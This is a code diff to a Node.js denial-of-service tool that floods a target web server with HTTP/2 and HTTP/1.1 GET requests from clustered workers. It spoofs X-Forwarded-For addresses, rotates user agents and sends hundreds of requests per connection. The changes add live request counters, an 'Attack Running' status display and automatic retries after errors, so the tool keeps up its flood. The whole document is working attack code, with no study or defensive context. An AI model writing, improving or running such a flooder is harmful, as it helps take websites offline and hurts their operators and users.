@@ -25,6 +25,9 @@ const userAgents = [
     // Add more for max effect
 ];
 
+let h2RequestsSent = 0;
+let h1RequestsSent = 0;
+
 function randIP() {
     return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(0, 255)}`;
 }
@@ -46,8 +49,23 @@ if (cluster.isMaster) {
         cluster.fork();
     }
 
+    const startTime = Date.now();
     const start = new Date().toLocaleTimeString();
     console.log(`\n[+] Attack Started @ ${start}`);
+
+    setInterval(() => {
+        const timeElapsed = Math.floor((Date.now() - startTime) / 1000);
+        const timeLeft = duration - timeElapsed;
+
+        console.clear();
+        console.log(`======================================`);
+        console.log(`[+] Attack Running...`);
+        console.log(`======================================`);
+        console.log(`[+] H2 Requests Sent: ${h2RequestsSent}`);
+        console.log(`[+] H1 Requests Sent: ${h1RequestsSent}`);
+        console.log(`[+] Time Left: ${timeLeft}s`);
+        console.log(`======================================`);
+    }, 1000);
 
     setTimeout(() => {
         console.log(`\n[+] Attack Ended @ ${new Date().toLocaleTimeString()}`);
@@ -75,9 +93,12 @@ if (cluster.isMaster) {
                     createConnection: () => socket
                 });
 
-                client.on('error', () => {});
+                client.on('error', () => {
+                    // Retry after error
+                    setTimeout(launchAttack, 2000); // Retry after 2 seconds
+                });
 
-                for (let i = 0; i < 1000; i++) {
+                for (let i = 0; i < 500; i++) {  // 500 requests per connection
                     const headers = {
                         ':method': 'GET',
                         ':path': path,
@@ -91,6 +112,8 @@ if (cluster.isMaster) {
                     req.end();
                 }
 
+                h2RequestsSent += 500; // Increment H2 requests count
+
                 setTimeout(() => {
                     client.close();
                     socket.destroy();
@@ -98,9 +121,11 @@ if (cluster.isMaster) {
             } else {
                 const req = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}\r\nX-Forwarded-For: ${randIP()}\r\nConnection: keep-alive\r\n\r\n`;
 
-                for (let i = 0; i < 1000; i++) {
+                for (let i = 0; i < 500; i++) {  // Send 500 requests
                     socket.write(req);
                 }
+
+                h1RequestsSent += 500; // Increment H1 requests count
 
                 setTimeout(() => socket.destroy(), 1500);
             }
@@ -108,12 +133,15 @@ if (cluster.isMaster) {
             loopCount++;
         });
 
-        socket.on('error', () => {});
+        socket.on('error', () => {
+            // Retry after error
+            setTimeout(launchAttack, 2000); // Retry after 2 seconds
+        });
     }
 
-    const interval = setInterval(launchAttack, 200);
+    const interval = setInterval(launchAttack, 500);  // Slow down to 500ms between each attack
 
     process.on('exit', () => {
-        console.log(`[+] Worker PID: ${process.pid} sent ~${loopCount * 1000} requests`);
+        console.log(`[+] Worker PID: ${process.pid} sent ~${loopCount * 500} requests`);
     });
 }
